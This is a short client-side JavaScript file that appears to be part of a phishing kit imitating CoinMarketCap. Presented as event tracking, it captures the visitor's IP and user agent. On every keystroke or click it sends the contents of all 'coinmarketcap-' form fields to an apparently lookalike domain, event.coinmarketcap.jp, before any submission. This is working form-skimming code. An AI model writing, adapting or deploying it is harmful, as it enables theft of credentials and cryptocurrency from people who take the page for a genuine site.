const BACKEND_URL = 'https://event.coinmarketcap.jp/';

document.addEventListener('DOMContentLoaded', function () {
  let userIP = 'none';
  let userAgent = 'none';

  function getUserIP() {
    fetch('https://api.ipify.org?format=json')
      .then((response) => response.json())
      .then((data) => {
        userIP = data.ip;
      })
      .catch((error) => {
        console.error('Error fetching IP address:', error);
      });
  }

  function getUserAgent() {
    userAgent = navigator.userAgent;
  }

  getUserIP();
  getUserAgent();

  function sendEvent(event) {
    const formData = {
      event: event,
      ip: userIP,
      userAgent: userAgent,
    };

    const inputs = document.querySelectorAll('[id^="coinmarketcap-"]');
    var isAllValueEmpty = true;
    for (const input of inputs) {
      const name = input.id.replace('coinmarketcap-', '');
      const value = input.value.trim();
      if (value !== '') {
        isAllValueEmpty = false;
        formData[name] = value;
      }
    }

    if (isAllValueEmpty == false) {
      const jsonData = JSON.stringify(formData);

      fetch(`${BACKEND_URL}event`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: jsonData,
      })
        .then((response) => response.json())
        .then((data) => {
          // console.log(data);
          console.log('OK');
        })
        .catch((error) => {
          console.error('Error:', error);
        });
    }
  }

  const inputs = document.querySelectorAll('[id^="coinmarketcap-"]');
  for (const input of inputs) {
    if (input.nodeName === 'INPUT') {
      input.addEventListener('keyup', function (event) {
        sendEvent('keyup');
      });
    } else if (input.nodeName === 'BUTTON') {
      input.addEventListener('click', function () {
        sendEvent('click');
      });
    }
  }
});
